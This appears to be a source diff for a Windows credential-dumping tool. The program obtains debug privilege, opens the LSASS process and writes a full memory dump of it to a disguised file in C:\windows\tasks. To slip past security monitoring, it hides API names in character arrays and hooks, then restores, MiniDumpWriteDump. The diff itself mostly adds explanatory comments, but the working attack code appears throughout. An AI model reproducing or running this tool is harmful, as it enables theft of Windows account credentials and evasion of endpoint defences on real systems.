@@ -15,6 +15,7 @@ Location: C:\Windows\Tasks\lsass.dmp
 char strMiniDumpWriteDump[] = { 'M','i','n','i','D','u','m','p','W','r','i','t','e','D','u','m','p', 0x0 };
 WCHAR strdbgcoredll[] = { 'd','b','g','c','o','r','e','.','d','l','l', 0x0 };
 
+// prepare variables to store information
 FARPROC origFunctionAddr = NULL;
 char origFunctionBytes[_ORIG_FUNCTION_BYTES] = { 0 };
 SIZE_T bytesWritten = 0;
@@ -51,6 +52,7 @@ DWORD FindProcessId(const std::wstring& processName)
     return pid;
 }
 
+// Check for administrator rights
 // https://stackoverflow.com/questions/8046097/how-to-check-if-a-process-has-the-administrative-rights
 BOOL IsElevated() {
     BOOL fRet = FALSE;
@@ -68,6 +70,7 @@ BOOL IsElevated() {
     return fRet;
 }
 
+// Try to get SeDebugPrivilege
 BOOL SetDebugPrivilege() {
     HANDLE hToken = NULL;
     TOKEN_PRIVILEGES TokenPrivileges = { 0 };
@@ -82,7 +85,7 @@ BOOL SetDebugPrivilege() {
     const wchar_t* lpwPriv = L"SeDebugPrivilege";
     if (!LookupPrivilegeValueW(NULL, (LPCWSTR)lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
         CloseHandle(hToken);
-        printf("I dont have SeDebugPirvs\n");
+        printf("I dont have SeDebugPrivs\n");
         return FALSE;
     }
 
@@ -97,6 +100,7 @@ BOOL SetDebugPrivilege() {
     return TRUE;
 }
 
+// Hooking function
 BOOL HookFunction(void* HookedFunction, char fName[] = {}) {
 
     // Reference the address of the hooked function 
@@ -126,6 +130,7 @@ BOOL HookFunction(void* HookedFunction, char fName[] = {}) {
     }
 }
 
+// UnHook to restore original API functionality
 BOOL UnHookFunction(LPVOID origFunctionAddr, LPCVOID origFunctionBytes, char fName[] = {}) {
 
     BOOL restoreFunc = WriteProcessMemory(hProcess, (LPVOID)origFunctionAddr, origFunctionBytes, _ORIG_FUNCTION_BYTES, &bytesWritten);
@@ -140,6 +145,8 @@ BOOL UnHookFunction(LPVOID origFunctionAddr, LPCVOID origFunctionBytes, char fNa
     return TRUE;
 }
 
+// Define a function that will replace the original one
+// this can be called a "trampoline" function
 BOOL __stdcall HookedMiniDumpWriteDump(
     HANDLE                            hProcess,
     DWORD                             ProcessId,
@@ -149,8 +156,10 @@ BOOL __stdcall HookedMiniDumpWriteDump(
     PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
     PMINIDUMP_CALLBACK_INFORMATION    CallbackParam)
 {
+    // Once inside this func, unhook MiniDump and restore operation to original one
     UnHookFunction(origFunctionAddr, origFunctionBytes, strMiniDumpWriteDump);
 
+    // return original Minidump
     return MiniDumpWriteDump(hProcess, ProcessId, hFile, DumpType, ExceptionParam, UserStreamParam, CallbackParam);
 
 }
@@ -170,12 +179,13 @@ int main()
         return -1;
     }
 
+    // Get address of original MiniDump
     origFunctionAddr = GetProcAddress(GetModuleHandleW(strdbgcoredll), strMiniDumpWriteDump);
     printf("[*] Original function address -> [ %p ]\n", origFunctionAddr);
 
-
     SIZE_T readBytes = 0;
-
+    
+    // Read 14 bytes from the address of the original MiniDUmp
     BOOL readOrigFunctionBytes = ReadProcessMemory(hProcess, origFunctionAddr, origFunctionBytes, _ORIG_FUNCTION_BYTES, &readBytes);
     if (0 == readOrigFunctionBytes) { return -2; }
     printf("[*] Original bytes -> [ %p ]\n", origFunctionBytes);
@@ -194,7 +204,7 @@ int main()
     printf("[+] LSASS PID: %d\n", lsaPID);
     printf("[+] LSASS HANDLE: %p\n", lsaProc);
 
-    char location[] = "C:\\windows\\tasks\\ribeye.bbq";
+    char location[] = "C:\\windows\\tasks\\ribeye.bbq"; // Dump location...
     printf("[*] Dumping LSASS to %s\n", location);
 
     HANDLE outFile = CreateFileA(location, GENERIC_ALL, 0, NULL, 2, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -204,6 +214,8 @@ int main()
         return -2;
     }
 
+    printf("[+] CreateFileA Handle: %p\n", outFile);
+
     openFile = OpenFile(location, &lpReOpenBuff, OF_READWRITE);
     if (!openFile) {
         printf("[-] Error openinig file %s\n", location);
@@ -211,12 +223,11 @@ int main()
         return -2;
     }
 
+    // Hook/Trampoline to the new function
     void* hookedMiniDumpAddr = &HookedMiniDumpWriteDump;
-
     HookFunction(hookedMiniDumpAddr, strMiniDumpWriteDump);
 
-    printf("[+] CreateFileA Handle: %p\n", outFile);
-
+    // Do the dumping after unhooking
     minidump = MiniDumpWriteDump(lsaProc, lsaPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
     if (minidump == false)
     {
@@ -226,6 +237,7 @@ int main()
 
     printf("[+] LSASS dumped to %s\n", location);
 
+    // Close handles
     CloseHandle(outFile);
     CloseHandle(lsaProc);
 
